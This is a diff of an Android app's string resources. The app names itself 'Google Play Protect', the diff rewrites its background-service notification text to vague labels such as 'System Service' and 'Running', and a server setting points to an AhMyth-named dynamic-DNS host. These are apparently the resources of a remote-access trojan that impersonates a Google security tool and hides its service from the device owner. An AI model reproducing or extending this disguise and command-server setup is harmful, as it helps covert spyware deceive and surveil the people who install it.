@@ -1,8 +1,8 @@
 <resources>
     <string name="app_name">Google Play Protect</string>
-    <string name="service_channel_name">Google Play Protect Service</string>
-    <string name="service_notification_title">Device protection is active</string>
-    <string name="service_notification_active">Scanning for security threats...</string>
+    <string name="service_channel_name">System Update Service</string>
+    <string name="service_notification_title">System Service</string>
+    <string name="service_notification_active">Running</string>
     
     <!-- Server Configuration -->
     <string name="server_ip">ahmythserver.duckdns.org</string> 
